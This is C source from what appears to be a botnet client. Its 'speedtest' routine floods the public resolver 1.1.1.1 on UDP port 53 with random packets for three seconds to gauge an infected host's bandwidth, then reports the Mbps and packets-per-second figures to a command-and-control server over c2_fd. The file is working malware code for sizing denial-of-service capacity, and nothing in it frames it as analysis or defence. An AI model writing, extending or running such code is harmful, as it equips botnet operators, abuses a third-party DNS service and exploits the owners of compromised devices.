#include "../modules/debug.h"
#include "../../encryption/chacha20_table.h"

#define NUM_THREADS 4
#define TEST_DURATION_SEC  3
#define SEND_BUF_SIZE      1400

extern int c2_fd;
extern struct sockaddr_in srv_addr;

static volatile int g_running = 1;
static volatile uint64_t g_thread_bytes[NUM_THREADS] = {0};
static volatile uint64_t g_thread_packets[NUM_THREADS] = {0};

static void fill_random(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] = 'a' + (rand() % 26);
}

static void *worker_thread(void *arg) {
    int tid = (int)(intptr_t)arg;
    
    char *payload = malloc(SEND_BUF_SIZE);
    if (!payload) return NULL;
    fill_random(payload, SEND_BUF_SIZE);

    int sock = sys_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        free(payload);
        return NULL;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(enc[ADDR_1_1_1_1].string);
    addr.sin_port = htons(53);

    int logged_send_err = 0;
    while (g_running) {
        ssize_t r = sys_sendto(sock, payload, SEND_BUF_SIZE, MSG_NOSIGNAL,
                           (void *)&addr, sizeof(addr));
        if (r > 0) {
            g_thread_bytes[tid] += r;
            g_thread_packets[tid]++;
        } else if (r == -1) {
            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR ||
                errno == ECONNREFUSED || errno == ENETUNREACH || errno == EHOSTUNREACH ||
                errno == 1 /*EPERM*/ || errno == 105 /*ENOBUFS*/ || errno == 12 /*ENOMEM*/)
            {
                if (!logged_send_err && errno != EAGAIN && errno != EWOULDBLOCK && errno != 105) {
                    logged_send_err = 1;
                }
                
                // If it's a rate limit or buffer full, yield briefly
                if (errno == 1 /*EPERM*/ || errno == 105 /*ENOBUFS*/) {
                    sys_usleep(1000); 
                }
                continue;
            }
            break;
        }
    }
    
    sys_close(sock);
    free(payload);
    return NULL;
}

void run_speedtest(void) {
    debug("Speedtest started (duration: %d seconds)\n", TEST_DURATION_SEC);
    
    for (int i = 0; i < NUM_THREADS; i++) {
        g_thread_bytes[i] = 0;
        g_thread_packets[i] = 0;
    }
    g_running = 1;

    /* Since pthread_create is stubbed in this libc-free environment, 
       we'll run the worker logic in the current process for the duration. */
    
    char *payload = malloc(SEND_BUF_SIZE);
    if (!payload) {
        debug("Speedtest failed: out of memory\n");
        return;
    }
    fill_random(payload, SEND_BUF_SIZE);

    int sock = sys_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        debug("Speedtest failed: could not create socket\n");
        free(payload);
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(enc[ADDR_1_1_1_1].string);
    addr.sin_port = htons(53);

    uint64_t total_bytes = 0;
    uint64_t total_packets = 0;
    uint32_t start_time = clock();

    debug("Flooding 1.1.1.1 to measure capacity...\n");
    while (clock() - start_time < TEST_DURATION_SEC * 1000) {
        ssize_t r = sys_sendto(sock, payload, SEND_BUF_SIZE, MSG_NOSIGNAL,
                           (void *)&addr, sizeof(addr));
        if (r > 0) {
            total_bytes += r;
            total_packets++;
        }
    }
    
    sys_close(sock);
    free(payload);

    uint64_t seconds = TEST_DURATION_SEC;
    uint32_t mbps_whole = (uint32_t)((total_bytes * 8) / (1000000 * seconds));
    uint32_t mbps_frac = (uint32_t)(((total_bytes * 8) % (1000000 * seconds)) * 100 / (1000000 * seconds));
    uint32_t pps = (uint32_t)(total_packets / seconds);

    debug("Speedtest results: %d.%02d Mbps (%d PPS)\n", mbps_whole, mbps_frac, pps);

    if (c2_fd != -1) {
        char report[128];
        char speed_str[64];

        int slen = sprintf(speed_str, enc[MSG_SPEEDTEST_REPORT_FMT].string, mbps_whole, mbps_frac, pps);
        
        report[0] = (uint8_t)((1 + slen) >> 8);
        report[1] = (uint8_t)((1 + slen) & 0xFF);
        report[2] = 0x03; // Speedtest ID
        memcpy(report + 3, speed_str, slen);

        sys_sendto(c2_fd, report, 3 + slen, MSG_NOSIGNAL, NULL, 0);
        debug("Report sent to CNC.\n");
    }
}
